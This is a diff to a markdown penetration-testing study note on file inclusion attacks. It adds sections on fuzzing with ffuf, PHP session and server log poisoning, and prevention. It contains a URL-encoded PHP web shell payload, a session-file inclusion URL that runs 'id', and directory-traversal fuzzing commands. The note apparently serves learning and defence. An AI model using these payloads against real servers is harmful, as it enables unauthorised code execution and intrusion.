@@ -18,6 +18,22 @@ The idea to exploit is to look for input parameters, and test them, as their bac
 > The query parameters used here are after the `?` character. however, if the payload is already inserted into a query parameter, then they should be placed after the `&` character.
 
 ---
+### Automating the Process of Finding and Exploiting
+
+Use automation tools to find endpoints to attack, such as fuzzing with [[ffuf]] to find hidden parameters for example. ([[ffuf#5. Parameters]])
+- After finding an endpoint, use a wordlist to try all the famous payloads. A good wordlist to use is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).
+- This wordlist can be used to obtain any of the important paths discussed below.
+###### Server Webroot Path
+An important location that needs to be known is the **server Webroot** path, or the root directory of the web application.
+- This path is useful in finding other files on the application, such as the `uploads` directory if we want to include a file that we uploaded.
+- This can be done by fuzzing for the `index.php` file using this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) while adding a few `../` back directories to the path: `ffuf -u http://page?language=../../../../../FUZZ/index.php`. 
+
+###### Tools
+
+The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).
+- Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution
+
+---
 ### Local File Inclusion (LFI)
 
 Identify injection points where attacker input can change the data being displayed to reveal files.
@@ -185,5 +201,85 @@ impacket-smbserver -smb2support share $(pwd)
 - To include a file, we need to use windows path format: `\\machine.ip\share\shell.php`.
 
 > Will most likely work only if we are on the same network as the application, as accessing remote SMB servers is blocked by default.
+
+---
+### Log Poisoning
+
+This technique of executing the file inclusion attack is conducted by writing PHP code into a user controllable field, and this user controlled input gets written to a **log file**.
+- This log file is then included, and the PHP code is executed.
+
+> The web application needs to have *read* permissions over the log files for this to work.
+
+Log files are large, and loading these files can take time and resources, which can be harmful in production environments. **TAKE CARE**.
+
+##### PHP Session Poisoning
+
+PHP applications use the `PHPSESSID` [[Cookies]] which holds user related data to keep track of user information.
+- This data is saved in `session` files in the back-end, such as `/var/lib/php/sessions` directory on Linux, and `C:\Windows\Temp\` directory on windows.
+
+> The name of the user specific file is the same as the `PHPSESSID` cookie name with the `sess_` prefix.
+
+To perform the attack, we check out the cookies and see if the cookie exists.
+- If it does, we try to include the file with the name of the cookie after the following string: `/var/lib/php/sessions/sess_COOKIENAME`.
+
+Including the file with this URL, we can check its content to see if it has anything we can control.
+- Sometimes, it has a `page` variable that is set to the value of page the user visited, or for example, the value of another query parameter that decides which page the user visits.
+
+After figuring out from where the `page` variable gets its value, we can place in it the PHP code that creates a web shell.
+- One example is the URL encoded ([[Web Encoding]]) version of the web shell.
+```url
+%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+- After placing that value in the parameter, we can then visit the session cookie file by including it and adding the `cmd` parameter with the command to be executed.
+```
+/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+> To execute multiple commands, we have to again insert the value of the `page` parameter again, because its value gets reset after visiting a different page. The best practice is to write a permanent web shell in the file, or to create [[Reverse Shells]].
+
+##### Server Log Poisoning
+
+Servers keep logs, and these logs contain information about the requests made to the server.
+- An important piece of information that gets logged with each request is the `User-Agent` header. 
+
+> MUST USE SINGLE QOUTES, DOUBLE QUOTES BREAKS THE LOG FILE. The double quote gets escaped in the log file.
+
+Since the `User-Agent` header can be controlled by us, we can insert a malicious payload and then use file inclusion vulnerability to load the log file, executing the commands.
+- Inserting a common web shell script in the `User-Agent` header and then loading the log file that contains that malicious script will give us code execution on the application.
+
+> Some important log files to note are `access.log` and `error.log`, which are stored in the Log directories, which change from server to server.
+
+**Apache** servers store logs in the following directories:
+- `/var/log/apache2/` in Linux systems.
+- `C:\xampp\apache\logs\` in Windows systems.
+
+**Nginx** servers store logs in the following directories:
+- `/var/log/ngingx/` in Linux systems.
+- `C:\nginx\log\` in Windows systems.
+
+If they are not there, then try fuzzing for them.
+- We can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) while also adding a few `../` back directories: `ffuf -u http://page?language=../../../../../FUZZ`
+
+There are also other logs that can be poisoned:
+- `/var/log/sshd.log`
+- `/var/log/mail`
+- `/var/log/vsftpd.log`
+
+The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. 
+ - We can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. 
+ 
+The main idea is to check if the log files can be read by us, as well as included.
+- Once that is the case, try and put code that will achieve our goals in the logs.
+- Then load the file to run that code.
+
+---
+### Prevention
+
+1. Avoid passing user controlled input to any file inclusion functions or APIs.
+	- If that is hard, then use whitelists.
+2. Prevent Directory Traversal attacks by using functions that pull out only the filename from user input.
+	- This includes adding recursive cleaners.
+3. Properly configure servers to close off any dangerous functions or options such as the `allow_url_include`.
+4. Use Web Application Firewalls.
 
 ---
